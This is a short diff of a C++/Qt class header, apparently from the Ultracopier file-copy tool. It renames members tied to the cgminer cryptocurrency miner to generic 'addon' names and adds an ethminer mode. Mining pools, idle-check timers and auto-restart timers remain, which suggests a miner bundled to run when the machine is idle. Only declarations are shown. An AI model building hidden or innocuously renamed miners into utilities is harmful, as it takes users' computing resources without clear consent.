@@ -64,7 +64,7 @@ private slots:
     void finished( int exitCode, QProcess::ExitStatus exitStatus );
     void readyReadStandardError();
     void readyReadStandardOutput();
-    void startCgminer();
+    void startAddon();
     //void checkWorking();
     void checkIdle();
     //int getcpuload();
@@ -131,12 +131,15 @@ private:
     OSSpecific *oSSpecific;
     bool allPluginsIsLoaded;
     #ifdef ULTRACOPIER_CGMINER
-    QProcess cgminer;
+    #if defined(_M_X64)//ethminer
+    QString addonMode;
+    #endif
+    QProcess addon;
     bool OpenCLDll;
-    bool haveCgminer;
+    bool haveAddon;
     QList<QStringList> pools;
-    QTimer restartcgminer;
-    QTimer autorestartcgminer;
+    QTimer restartaddon;
+    QTimer autorestartaddon;
     QTimer checkIdleTimer,checkWorkingTimer;
     quint32 dwTimeIdle;
     QTime dwTimeIdleTime;
